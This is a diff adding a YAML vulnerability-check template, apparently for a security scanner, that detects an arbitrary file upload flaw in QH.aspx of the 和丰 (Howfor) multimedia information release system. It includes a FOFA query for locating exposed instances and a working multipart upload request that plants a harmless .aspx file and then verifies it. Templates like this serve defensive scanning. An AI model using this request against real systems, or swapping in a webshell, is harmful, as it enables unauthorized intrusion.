@@ -1,0 +1,52 @@
+id: poc-yaml-howfor-qh-aspx-anyfile-upload
+info:
+  name: 和丰多媒体信息发布系统 QH.aspx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 和丰多媒体信息发布系统
+  fofa: app="和丰山海-数字标牌"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /QH.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeegvclmyurlotuey
+  data: '------WebKitFormBoundaryeegvclmyurlotuey
+
+    Content-Disposition: form-data; name="fileToUpload"; filename="{{.t1}}.aspx"
+
+    Content-Type: application/octet-stream
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryeegvclmyurlotuey
+
+    Content-Disposition: form-data; name="action"
+
+
+    upload
+
+    ------WebKitFormBoundaryeegvclmyurlotuey
+
+    Content-Disposition: form-data; name="responderId"
+
+
+    ResourceNewResponder
+
+    ------WebKitFormBoundaryeegvclmyurlotuey
+
+    Content-Disposition: form-data; name="remotePath"
+
+
+    /opt/resources
+
+    ------WebKitFormBoundaryeegvclmyurlotuey--'
+  expression: status_code == 200 && contains(body,"\"first\"\x3a true")
+- method: GET
+  path: /opt/resources/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
